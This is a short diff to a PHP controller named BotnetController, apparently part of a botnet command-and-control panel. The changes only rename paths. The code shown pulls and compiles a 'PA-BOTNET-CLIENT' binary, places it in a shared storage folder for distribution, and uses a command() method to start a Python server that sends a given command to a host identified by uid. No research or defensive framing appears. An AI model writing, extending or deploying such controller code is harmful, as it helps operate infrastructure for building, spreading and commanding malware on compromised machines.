@@ -91,7 +91,7 @@ class BotnetController extends Controller
 
         $result = [];
 
-        $fullpath = $path . 'PA-BOTNET-CLIENT-v2/';
+        $fullpath = $path . 'PA-BOTNET-CLIENT';
 
         $command = "cd $fullpath && git pull";
         exec($command, $output, $return);
@@ -115,7 +115,7 @@ class BotnetController extends Controller
             mkdir(storage_path('BOTNET-SHARE'), 0777, true);
         }
 
-        $compiledFilePath = $fullpath . 'target/release/PA-BOTNET-CLIENT-v2';
+        $compiledFilePath = $fullpath . 'target/release/PA-BOTNET-CLIENT';
         $storagePath = storage_path('BOTNET-SHARE/PA-BOTNET-CLIENT');
 
 
@@ -244,7 +244,7 @@ class BotnetController extends Controller
     public function command($uid, $value){
         $path = env('PATH_PYTHON_EXECUTABLE');
         $value = escapeshellarg($value);
-        
+
         $command = "nohup ".$path."PA-BOTNET-PYSRV/venv/bin/python3 ".$path."PA-BOTNET-PYSRV/main.py --command --value ".$value." --host ".$uid." > /dev/null 2>&1 & echo $!";
         exec($command, $output, $return);
 
